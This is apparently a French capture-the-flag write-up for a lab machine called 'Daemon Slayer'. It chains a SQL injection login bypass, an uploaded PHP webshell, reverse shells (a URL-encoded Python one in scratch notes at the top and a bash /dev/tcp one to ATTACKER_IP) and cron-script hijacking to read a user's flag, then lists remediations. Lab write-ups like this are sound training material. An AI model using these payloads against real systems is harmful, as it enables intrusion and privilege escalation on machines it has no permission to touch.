---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-89, CWE-434 et CWE-276
---

# Daemon Slayer — Récupération du flag utilisateur
http://10.10.0.43:445/upper/admin/login.php

se login ```admin' OR 1=1-- ```


python3 -c 'import socket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect(("10.8.1.52"%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bpty.spawn("%2Fbin%2Fbash")'


# Daemon Slayer — Récupération du flag utilisateur

## 1 / Reconnaissance initiale

On commence par un scan complet des ports sur la cible :

```bash
nmap -sC -sV -p- 10.10.0.43
```

On obtient :

```text
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.68 ((Debian))
445/tcp open  http    Apache httpd 2.4.68 ((Debian))
```

Le port `445` est censé être du **SMB (Samba)**, mais répond ici en HTTP — c'est un indice volontaire du challenge (thème "Daemon Slayer").

---

## 2 / Fuzzing des répertoires web

On fuzz les deux ports avec `ffuf` :

```bash
ffuf -u http://10.10.0.43/FUZZ \
  -w /snap/seclists/1214/Discovery/Web-Content/raft-medium-directories.txt \
  -e .php,.txt,.html,.zip -mc 200,301,302,403
```

Le bruteforce classique ne donne rien de plus que la page par défaut Apache. On regarde alors les ressources liées dans le code source de la page :

```bash
curl -s http://10.10.0.43/ | grep -oE 'src="[^"]+"|href="[^"]+"'
```

On découvre une page cachée :

```text
/assets/css/style.css
```

qui mène à une page contenant :

```html
<!-- 445 is samba, right ? -->
```

Cet indice confirme qu'il faut chercher une application cachée sur le port `445`.

---

## 3 / Découverte de l'application "Demon Human Food Tracker"

En fuzzant plus profondément le port `445`, on trouve un panel d'administration :

```text
http://10.10.0.43:445/upper/admin/login.php
```

Il s'agit d'un CMS PHP de type AdminLTE, nommé **Demon Human Food Tracker**.

---

## 4 / Contournement de l'authentification (SQL injection)

Le formulaire de login est vulnérable à une injection SQL classique :

```text
Username: admin' OR 1=1-- 
Password: osefff
```

Cette injection permet de bypasser l'authentification et d'accéder au dashboard admin.

---

## 5 / Identification du paramètre `page`

Une fois connecté, l'URL du dashboard révèle un paramètre GET :

```text
http://10.10.0.43:445/upper/admin/?page=feeding_violations
```

Le paramètre accepte également des sous-chemins :

```text
http://10.10.0.43:445/upper/admin/?page=user/list
```

Ce comportement suggère une inclusion de fichier côté serveur du type :

```php
include($base_dir . $_GET['page'] . '.php');
```

potentiellement vulnérable à une **Local File Inclusion (LFI)**.

---

## 6 / Exploitation via upload de fichier (RCE)

Le CMS propose une fonctionnalité d'upload de fichier (photo de profil / logo). On en profite pour uploader directement un webshell PHP :

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
```

Le fichier uploadé se retrouve accessible sous :

```text
http://10.10.0.43:445/upper/uploads/shell.php
```

On confirme l'exécution de commandes :

```bash
curl -s "http://10.10.0.43:445/upper/uploads/shell.php" -G --data-urlencode "cmd=id"
```

Résultat :

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 7 / Passage à un reverse shell

Les commandes envoyées via le paramètre GET `cmd=` souffrent de problèmes d'encodage et de troncature dans le navigateur (les caractères `>`, `&`, `|` sont mal interprétés par l'URL). On bascule donc sur un **reverse shell** pour obtenir un vrai terminal interactif :

```bash
nc -lvnp 4444
```

```text
cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Le reverse shell élimine les problèmes d'encodage HTTP et donne un environnement `bash` complet avec `$PATH` correct.

---

## 8 / Localisation du flag utilisateur

On énumère `/home` :

```bash
ls -la /home/
```

```text
drwx------ 1 muzan muzan 4096 Aug 27 09:34 muzan
```

L'utilisateur `muzan` possède un répertoire `home` avec des permissions `700`, inaccessible directement pour `www-data` :

```bash
ls -la muzan
ls: cannot open directory 'muzan': Permission denied
```

---

## 9 / Recherche d'un vecteur d'élévation vers `muzan`

On énumère les tâches planifiées :

```bash
cat /etc/crontab
```

On découvre une entrée intéressante :

```text
* * * * * muzan /var/www/scripts/immortality_check.sh
```

Ce script est exécuté **chaque minute en tant que `muzan`**.

On vérifie les permissions du fichier et de son répertoire parent :

```bash
ls -la /var/www/scripts/
```

```text
drwxr-xr-x 1 www-data www-data 4096 Jul 23 13:42 .
-rwxr-xr-x 1 muzan    muzan    535  Jul 23 13:42 immortality_check.sh
```

Le fichier `immortality_check.sh` appartient à `muzan`, mais le **répertoire parent appartient à `www-data`**. En Linux, c'est le propriétaire du répertoire qui contrôle la suppression et la création des fichiers qu'il contient — on peut donc supprimer et remplacer le script, bien qu'on ne puisse pas l'éditer directement.

---

## 10 / Détournement du cron pour lire `user.txt`

On supprime l'ancien script :

```bash
rm /var/www/scripts/immortality_check.sh
```

On le remplace par un script qui copie le flag dans un emplacement lisible par `www-data` :

```bash
echo '#!/bin/bash' > /var/www/scripts/immortality_check.sh
echo 'cat /home/muzan/user.txt > /tmp/flag.txt' >> /var/www/scripts/immortality_check.sh
chmod 755 /var/www/scripts/immortality_check.sh
```

Le nouveau script est automatiquement exécuté par `cron` en tant que `muzan` à la minute suivante, produisant un fichier `/tmp/flag.txt` accessible en lecture par `www-data`.

On attend l'exécution du cron, puis on lit le résultat :

```bash
cat /tmp/flag.txt
```

Le flag utilisateur est ainsi récupéré.

---

## 11 / Chaîne d'exploitation

```text
Port 445 (déguisé en HTTP, indice "445 is samba, right?")
    │
    ▼
Page cachée /assets/css/style.css
    │
    ▼
Panel admin /upper/admin/login.php
    │
    │ SQL injection (admin' OR '1'='1)
    ▼
Dashboard authentifié
    │
    │ Upload de fichier arbitraire
    ▼
Webshell PHP (www-data)
    │
    │ Reverse shell (contourne les limites d'encodage HTTP)
    ▼
Shell interactif www-data
    │
    │ Cron /var/www/scripts/immortality_check.sh (exécuté par muzan)
    │ Répertoire parent appartenant à www-data → remplacement du script
    ▼
Exécution de code en tant que muzan
    │
    ▼
/home/muzan/user.txt
```

---

## 12 / Vulnérabilités exploitées

### SQL Injection sur le formulaire de login

Absence d'échappement / de requêtes préparées sur les champs `username` / `password`, permettant un bypass d'authentification classique.

### Upload de fichier non filtré

Le CMS permet l'upload d'un fichier `.php` exécutable, sans validation de l'extension ni du contenu, menant à une exécution de code arbitraire (RCE).

### Cron job exécuté par un utilisateur privilégié dans un répertoire mal cloisonné

```text
* * * * * muzan /var/www/scripts/immortality_check.sh
```

Le script est possédé par `muzan`, mais son répertoire parent appartient à `www-data`. Cette incohérence de propriété permet à `www-data` de remplacer le script, qui sera ensuite exécuté avec les privilèges de `muzan` lors du prochain tick de cron — un détournement de tâche planifiée (cron hijacking).

## Remédiation

- Utiliser des requêtes préparées et valider strictement les entrées du formulaire de connexion.
- Autoriser uniquement les extensions et types MIME attendus lors d'un upload, stocker les fichiers hors du webroot et désactiver leur exécution.
- Faire posséder le script cron et tous ses répertoires parents par `root`, sans écriture pour `www-data`.
- Remplacer le script cron par un fichier non modifiable par l'utilisateur dont les privilèges sont utilisés, et journaliser ses exécutions.

## Reproductibilité

Les commandes `nmap`, `ffuf`, `curl`, `nc`, `ls` et `cat` ainsi que leurs résultats sont visibles dans les étapes précédentes. Un tiers peut rejouer le parcours sur la même cible en reprenant les URLs, paramètres et charges utiles indiqués.